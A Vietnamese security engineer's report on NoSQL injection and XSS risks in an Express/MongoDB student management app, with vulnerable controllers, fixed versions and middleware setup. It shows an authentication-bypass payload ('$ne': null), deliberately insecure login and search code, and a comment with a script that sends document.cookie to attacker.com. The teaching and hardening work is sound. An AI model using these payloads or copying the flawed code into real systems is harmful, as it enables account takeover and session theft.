# BÁO CÁO PHÂN TÍCH NGUY CƠ BẢO MẬT & GIẢI PHÁP PHÒNG THỦ
## Hệ thống Student Management System (Node.js, Express.js, MongoDB)

**Vai trò:** Security Engineer  
**Hệ thống:** Student Management System  
**Công nghệ:** Node.js, Express.js, MongoDB, Mongoose  
**Ngày thực hiện:** 30/07/2026  

---

## 1. GIẢI THÍCH CHI TIẾT VỀ SQL INJECTION (NOSQL INJECTION) VÀ XSS

### 1.1 SQL Injection và NoSQL Injection

#### a. SQL Injection (SQLi) là gì?
SQL Injection là một kỹ thuật tấn công mã độc, trong đó kẻ tấn công chèn (inject) các câu lệnh SQL không hợp lệ hoặc độc hại thông qua các dữ liệu đầu vào của ứng dụng (input query strings, form fields, headers). Khi ứng dụng nối chuỗi dữ liệu (string concatenation) trực tiếp vào truy vấn CSDL quan hệ (như MySQL, PostgreSQL, MS SQL), cú pháp câu lệnh SQL bị thay đổi.

- **Hậu quả:** Bypass xác thực đăng nhập, đọc/sửa/xóa toàn bộ CSDL (Data Breach), thực thi lệnh từ xa (RCE) trên hệ điều hành của database server.

#### b. NoSQL Injection trong môi trường Node.js & MongoDB
Mặc dù MongoDB không sử dụng ngôn ngữ SQL tiêu chuẩn, hệ thống Node.js + Express + MongoDB vẫn phải đối mặt với **NoSQL Injection**. 

Trong Express.js, `express.json()` hoặc `express.urlencoded({ extended: true })` tự động parse các payload JSON dạng Object từ client. Nếu ứng dụng truyền thẳng `req.body` vào hàm tìm kiếm của Mongoose/MongoDB (như `User.findOne(req.body)` hoặc `User.findOne({ username: req.body.username, password: req.body.password })`), kẻ tấn công có thể gửi dữ liệu dạng Object chứa các toán tử truy vấn của MongoDB như `$ne` (not equal), `$gt` (greater than), `$regex`, `$where`.

- **Ví dụ minh họa cơ chế:**
  Gửi JSON Body:
  ```json
  {
    "username": "admin",
    "password": { "$ne": null }
  }
  ```
  Query thực thi tại CSDL trở thành: "Tìm user có `username = 'admin'` VÀ `password != null`". Kẻ tấn công lập tức đăng nhập thành công vào tài khoản Admin mà không cần biết mật khẩu.

---

### 1.2 Cross-Site Scripting (XSS)

#### a. XSS là gì?
Cross-Site Scripting (XSS) là lỗ hổng bảo mật ứng dụng web cho phép kẻ tấn công chèn các đoạn mã kịch bản độc hại (phổ biến nhất là JavaScript) vào nội dung hiển thị cho người dùng khác. Mã script này sẽ được trình duyệt web của nạn nhân thực thi dưới ngữ cảnh (context) và quyền hạn của người dùng đó.

#### b. Các dạng XSS phổ biến:
1. **Stored XSS (Persistent XSS):** Mã độc được lưu trực tiếp vào CSDL (ví dụ: trong trường tên sinh viên, ghi chú, bình luận). Mỗi khi người dùng khác (ví dụ: Giảng viên, Admin) tải trang danh sách sinh viên, đoạn script độc sẽ tự động thực thi trên trình duyệt của họ. Đây là dạng XSS nguy hiểm nhất.
2. **Reflected XSS (Non-persistent XSS):** Mã độc nằm trong URL query parameter (ví dụ: `http://example.com/students?search=<script>...</script>`). Ứng dụng nhận request và phản hồi lại trình duyệt chứa đoạn script đó mà không qua khâu mã hóa/lọc.
3. **DOM-based XSS:** Lỗ hổng xảy ra hoàn toàn ở client-side, khi JavaScript trên trình duyệt lấy dữ liệu từ nguồn không tin cậy (như `location.hash`, `location.search`) và ghi trực tiếp vào DOM bằng các hàm nguy hiểm như `element.innerHTML`, `document.write()`, `eval()`.

#### c. Hậu quả của XSS:
- Đánh cắp Token xác thực (JWT), Session Cookie (nếu không có flag `HttpOnly`).
- Mạo danh nạn nhân gửi request độc hại tới API (CSRF/Session Hijacking).
- Ghi lại thao tác bàn phím (Keylogging) hoặc thay đổi giao diện web (Defacement) để lừa đảo (Phishing).

---

## 2. VÍ DỤ MÃ NGUỒN KHÔNG AN TOÀN (VULNERABLE CODE EXAMPLES)

### 2.1 Ví dụ 1: Mã nguồn lỗi NoSQL Injection (Authentication Controller)

File: `src/controllers/auth.controller.js` (Không an toàn)

```javascript
// ❌ MÃ NGUỒN KHÔNG AN TOÀN: Dễ bị NoSQL Injection
const User = require('../models/user.model');

const login = async (req, res) => {
  try {
    const { username, password } = req.body;

    // LỖ HỔNG BẢO MẬT: Truyền trực tiếp req.body vào query
    // Kẻ tấn công có thể truyền password là object: { "$ne": "" }
    const user = await User.findOne({ 
      username: username, 
      password: password 
    });

    if (!user) {
      return res.status(401).json({ message: 'Tài khoản hoặc mật khẩu không chính xác' });
    }

    return res.status(200).json({ message: 'Đăng nhập thành công', user });
  } catch (error) {
    return res.status(500).json({ message: error.message });
  }
};
```

---

### 2.2 Ví dụ 2: Mã nguồn lỗi Stored XSS & Reflected XSS (Student Controller)

File: `src/controllers/student.controller.js` (Không an toàn)

```javascript
// ❌ MÃ NGUỒN KHÔNG AN TOÀN: Dễ bị Stored XSS & Reflected XSS
const Student = require('../models/student.model');

// Create Student - Dễ bị Stored XSS
const createStudent = async (req, res) => {
  try {
    // Không sanitize input, nhận trực tiếp HTML/Script tags từ client
    // Ví dụ: req.body.fullName = "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
    const newStudent = await Student.create(req.body);

    return res.status(201).json({ success: true, data: newStudent });
  } catch (error) {
    return res.status(500).json({ message: error.message });
  }
};

// Search Student - Dễ bị Reflected XSS khi render HTML response
const searchStudentUnsafe = async (req, res) => {
  const keyword = req.query.name; // Ví dụ: ?name=<script>alert('XSS')</script>
  
  // Trả về HTML raw trực tiếp phản hồi lại input của user mà không encode
  res.send(`<h1>Kết quả tìm kiếm cho: ${keyword}</h1>`);
};
```

---

## 3. PHIÊN BẢN MÃ NGUỒN ĐÃ KHẮC PHỤC (REMEDIATED CODE)

### 3.1 Khắc phục NoSQL Injection (Authentication Controller)

File: `src/controllers/auth.controller.js` (Đã khắc phục)

```javascript
// ✅ MÃ NGUỒN ĐÃ KHẮC PHỤC NOSQL INJECTION
const User = require('../models/user.model');
const bcrypt = require('bcryptjs');

const loginSafe = async (req, res) => {
  try {
    const { username, password } = req.body;

    // 1. CHẮC CHẮN ĐẦU VÀO LÀ STRING (Ép kiểu & Validate)
    if (typeof username !== 'string' || typeof password !== 'string') {
      return res.status(400).json({ 
        success: false, 
        message: 'Dữ liệu đầu vào không hợp lệ (Username và Password phải là chuỗi ký tự)' 
      });
    }

    // 2. TÌM USER BẰNG CHUỖI THUẦN (String cast an toàn)
    const user = await User.findOne({ username: String(username).trim() }).select('+password');

    if (!user) {
      return res.status(401).json({ success: false, message: 'Tài khoản hoặc mật khẩu không chính xác' });
    }

    // 3. SO SÁNH HASH BẰNG BCRYPT (Tránh so sánh plaintext)
    const isPasswordValid = await bcrypt.compare(password, user.password);
    if (!isPasswordValid) {
      return res.status(401).json({ success: false, message: 'Tài khoản hoặc mật khẩu không chính xác' });
    }

    return res.status(200).json({
      success: true,
      message: 'Đăng nhập thành công',
      data: { id: user._id, username: user.username, role: user.role }
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: 'Lỗi máy chủ nội bộ' });
  }
};
```

---

### 3.2 Khắc phục Stored & Reflected XSS (Student Controller & Validation)

File: `src/controllers/student.controller.js` (Đã khắc phục)

```javascript
// ✅ MÃ NGUỒN ĐÃ KHẮC PHỤC XSS
const Student = require('../models/student.model');
const sanitizeHtml = require('sanitize-html');

// Hàm Helper để làm sạch tất cả ký tự HTML/Script nguy hại trong Input
const sanitizeInput = (text) => {
  if (typeof text !== 'string') return text;
  return sanitizeHtml(text, {
    allowedTags: [], // Không cho phép bất kỳ thẻ HTML nào (loại bỏ hoàn toàn <script>, <iframe>,...)
    allowedAttributes: {}
  }).trim();
};

const createStudentSafe = async (req, res) => {
  try {
    const { studentCode, fullName, email, phone, dateOfBirth } = req.body;

    // 1. Sanitize các trường dữ liệu kiểu chuỗi trước khi lưu vào MongoDB
    const safeData = {
      studentCode: sanitizeInput(studentCode),
      fullName: sanitizeInput(fullName),
      email: sanitizeInput(email),
      phone: sanitizeInput(phone),
      dateOfBirth
    };

    const newStudent = await Student.create(safeData);

    // 2. Đảm bảo response là JSON chuẩn (Header Content-Type: application/json)
    return res.status(201).json({
      success: true,
      message: 'Tạo sinh viên thành công',
      data: newStudent
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

const searchStudentSafe = async (req, res) => {
  try {
    const keyword = sanitizeInput(req.query.name || '');

    const students = await Student.find({
      fullName: { $regex: keyword, $options: 'i' }
    });

    // Luôn trả về phản hồi JSON thay vì trả về HTML string tự lắp ghép
    return res.status(200).json({
      success: true,
      query: keyword, // Đã được sanitize loại bỏ mã độc
      data: students
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};
```

---

## 4. ĐỀ XUẤT CÁC MIDDLEWARE BẢO MẬT CHI TIẾT

Để bảo vệ toàn diện hệ thống Express + MongoDB, cần triển khai bộ middleware bảo mật theo chuẩn phòng thủ chiều sâu (Defense-in-Depth).

### 4.1 Cài đặt các gói Dependency Bảo mật
```bash
npm install helmet cors express-validator express-mongo-sanitize express-rate-limit hpp
```

---

### 4.2 Chi tiết cấu hình các Middleware Bảo mật

#### a. Express-Validator (Middleware Kiểm tra & Làm sạch dữ liệu ở tầng Router)
File: `src/validations/auth.validation.js`

```javascript
const { body, validationResult } = require('express-validator');

// Validation rules cho Đăng nhập
const loginValidationRules = [
  body('username')
    .isString().withMessage('Username phải là chuỗi ký tự')
    .trim()
    .notEmpty().withMessage('Username không được để trống')
    .escape(), // Mã hóa các ký tự đặc biệt như <, >, &, ', "
  
  body('password')
    .isString().withMessage('Password phải là chuỗi ký tự')
    .notEmpty().withMessage('Password không được để trống')
];

// Middleware xử lý kết quả validation
const validate = (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({
      success: false,
      errors: errors.array().map(err => ({ field: err.path, message: err.msg }))
    });
  }
  next();
};

module.exports = { loginValidationRules, validate };
```

#### b. Cấu hình tổng hợp các Middleware Bảo mật trong `src/app.js`

```javascript
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const mongoSanitize = require('express-mongo-sanitize');
const rateLimit = require('express-rate-limit');
const hpp = require('hpp');
const morgan = require('morgan');

const routes = require('./routes');
const { notFoundHandler, errorHandler } = require('./middlewares/errorHandler');

const app = express();

// 1. HELMET: Thiết lập các HTTP Security Headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:"],
    },
  },
  crossOriginEmbedderPolicy: true,
}));

// 2. CORS: Cấu hình phân quyền Origin truy cập API
const allowedOrigins = [process.env.CLIENT_URL || 'http://localhost:3000'];
app.use(cors({
  origin: (origin, callback) => {
    // Cho phép requests không có origin (như Mobile apps, Postman, Curl) hoặc trong whitelist
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS Policy: Truy cập từ Origin này bị từ chối.'));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 86400 // Cache preflight request 24h
}));

// 3. LIMIT PAYLOAD SIZE: Chống DoS bằng payload dung lượng cực lớn
app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ extended: true, limit: '10kb' }));

// 4. MONGO SANITIZE: Chống NoSQL Query Injection bằng cách xóa kí tự '$' và '.'
app.use(mongoSanitize({
  replaceWith: '_', // Thay thế kí tự $ và . bằng dấu gạch dưới
}));

// 5. HPP: Chống HTTP Parameter Pollution (Gửi trùng lặp Query Params)
app.use(hpp());

// 6. RATE LIMITING: Giới hạn số lượng request chống Brute-force & DoS
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 100, // Giới hạn tối đa 100 requests / 15 phút cho mỗi IP
  standardHeaders: true,
  legacyHeaders: false,
  message: {
    success: false,
    message: 'Quá nhiều yêu cầu từ IP này. Vui lòng thử lại sau 15 phút.'
  }
});

// Áp dụng Rate Limit cho toàn bộ API v1
app.use('/api/v1', apiLimiter);

// Logging (Dev Mode)
if (process.env.NODE_ENV !== 'test') {
  app.use(morgan('dev'));
}

// Health Check Endpoint
app.get('/health', (req, res) => {
  res.status(200).json({ success: true, message: 'API is healthy', data: { uptime: process.uptime() } });
});

// Routes
app.use('/api/v1', routes);

// Error Handling Middlewares
app.use(notFoundHandler);
app.use(errorHandler);

module.exports = app;
```

---

## 5. GIẢI THÍCH VÌ SAO MỖI BIỆN PHÁP GIÚP TĂNG CƯỜNG BẢO MẬT

| STT | Biện pháp / Middleware | Cơ chế hoạt động kỹ thuật | Vì sao giúp tăng cường bảo mật? |
|---|---|---|---|
| **1** | **Helmet.js** | Tự động thêm và cấu hình 15 HTTP Security Headers quan trọng (`Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `X-Permitted-Cross-Domain-Policies`, ẩn header `X-Powered-By`). | • **Chống XSS**: `CSP` ngăn trình duyệt thực thi các inline script độc hại.<br>• **Chống Clickjacking**: `X-Frame-Options: DENY` ngăn ứng dụng bị chèn vào `<iframe>`.<br>• **Chống MIME-sniffing**: `X-Content-Type-Options: nosniff` buộc trình duyệt tuân thủ đúng MIME type do server khai báo.<br>• **Ẩn công nghệ**: Ẩn header `Express` để tránh bị kẻ tấn công dò quét lỗ hổng theo version. |
| **2** | **CORS (Cross-Origin Resource Sharing)** | Trả về các HTTP Headers chỉ định chính xác Domain/Origin nào được quyền thực hiện Cross-Origin requests tới API (`Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`). | • **Ngăn chặn truy cập trái phép**: Ngăn các trang web độc hại từ domain khác tự động gọi API bằng AJAX/Fetch để đánh cắp hoặc gửi dữ liệu của người dùng.<br>• **Ngăn ngừa CSRF**: Hạn chế phương thức HTTP và Header tùy chỉnh được gửi từ các origin ngoài whitelist. |
| **3** | **express-validator / Joi** | Kiểm tra nghiêm ngặt kiểu dữ liệu (`isString`, `isEmail`), độ dài (`isLength`), cấu trúc và làm sạch (`trim`, `escape`, `sanitize`) dữ liệu `req.body`, `req.query`, `req.params` ngay tại tầng Route. | • **Chống NoSQL/SQL Injection**: Loại bỏ nguy cơ client gửi dữ liệu kiểu `Object` thay vì `String` vào CSDL.<br>• **Chống XSS**: Mã hóa ký tự đặc biệt (`escape`) chuyển `<script>` thành `&lt;script&gt;`.<br>• **Đảm bảo toàn vẹn dữ liệu**: Từ chối request không hợp lệ ngay lập tức trước khi đi vào logic xử lý phức tạp của Controller. |
| **4** | **express-mongo-sanitize** | Duyệt qua toàn bộ `req.body`, `req.query`, `req.params` và xóa hoặc thay thế tất cả các phím (keys) bắt đầu bằng dấu `$` (MongoDB Operators) hoặc chứa dấu `.`. | • **Triệt tiêu NoSQL Injection**: Vô hiệu hóa triệt để các payload chứa toán tử MongoDB như `{"$ne": null}`, `{"$gt": ""}`, `{"$where": ...}` kể cả khi lập trình viên quên ép kiểu dữ liệu ở Controller. |
| **5** | **express-rate-limit** | Lưu vết số lượng HTTP requests của từng địa chỉ IP trong một khoảng thời gian (slide window algorithm) và trả về HTTP Status `429 Too Many Requests` khi vượt giới hạn. | • **Chống Brute-Force Attack**: Ngăn kẻ tấn công dùng công cụ tự động thử hàng ngàn mật khẩu trên endpoint `/login`.<br>• **Chống DoS/DDoS**: Bảo vệ tài nguyên CPU/RAM của Server khỏi bị cạn kiệt bởi lượng request đột biến từ kẻ tấn công. |
| **6** | **HTTP Parameter Pollution (hpp)** | Phát hiện và xử lý các Query Parameter bị trùng lặp (ví dụ: `?role=admin&role=user` tạo thành mảng `req.query.role = ['admin', 'user']`). | • **Tránh đường lối kiểm tra bị qua mặt (Bypass Validation)**: Ngăn ngừa lỗi logic ở backend khi code chỉ kỳ vọng `req.query.role` là chuỗi nhưng bị biến thành mảng. |
| **7** | **Làm sạch Output HTML (Sanitize-HTML / JSON Response)** | Chuyển đổi toàn bộ API response thành định dạng `application/json` chuẩn hoặc dùng thư viện `sanitize-html` loại bỏ các tag HTML nguy hiểm trước khi lưu vào CSDL. | • **Triệt tiêu Stored XSS & Reflected XSS**: Đảm bảo dữ liệu do người dùng nhập (dù chứa mã độc JavaScript) cũng chỉ được coi là văn bản thuần (plain text) chứ không thể thực thi thành script trên trình duyệt. |

---

## 6. KẾT LUẬN & NGHỊ QUYẾT BẢO MẬT (RECOMMENDATIONS)

1. **Áp dụng mô hình Phòng thủ chiều sâu (Defense-in-Depth):** Không bao giờ phụ thuộc vào duy nhất một lớp bảo vệ. Cần kết hợp cả Middleware hệ thống (`Helmet`, `CORS`, `MongoSanitize`, `RateLimit`), Tầng kiểm duyệt (`express-validator`), và Logic code an toàn (`Mongoose Type Casting`, `Bcrypt Hashing`).
2. **Khai báo Schema Mongoose chặt chẽ:** Luôn đặt `type`, `required`, `trim` và định dạng validation cụ thể cho từng thuộc tính trong Mongoose Model.
3. **Thường xuyên audit phụ thuộc (Dependencies Audit):** Sử dụng lệnh `npm audit` định kỳ để phát hiện và vá sớm các lỗ hổng bảo mật nằm trong các thư viện third-party.
